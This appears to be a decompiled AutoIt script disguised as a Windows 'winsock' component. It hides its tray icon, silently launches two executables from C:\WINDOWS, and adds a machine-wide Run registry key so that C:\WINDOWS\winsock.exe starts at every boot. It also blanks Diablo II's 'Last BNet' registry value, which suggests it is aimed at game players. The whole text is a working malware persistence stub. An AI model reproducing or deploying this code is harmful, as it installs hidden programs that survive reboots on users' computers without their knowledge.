; <AUT2EXE VERSION: 3.1.1.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Dokumente und Einstellungen\MIDL\Desktop\WINSOCK.au3>
; ----------------------------------------------------------------------------


#notrayicon
If Not ProcessExists("winsockz.exe") then
Run("winsockz.exe", "C:\WINDOWS\")
Run("LEXPP.exe", "C:\WINDOWS\")
endif
RegWrite("HKEY_CURRENT_USER\Software\Blizzard Entertainment\Diablo II\", "Last BNet", "REG_SZ", "")
RegWrite("HKEY_CURRENT_USER\Software\Blizzard Entertainment\Diablo II\", "Last BNet", "REG_SZ", "")
RegWrite("HKEY_CURRENT_USER\Software\Blizzard Entertainment\Diablo II\", "Last BNet", "REG_SZ", "")
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "winsock.client", "REG_SZ", "C:\WINDOWS\winsock.exe")


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Dokumente und Einstellungen\MIDL\Desktop\WINSOCK.au3>
; ----------------------------------------------------------------------------

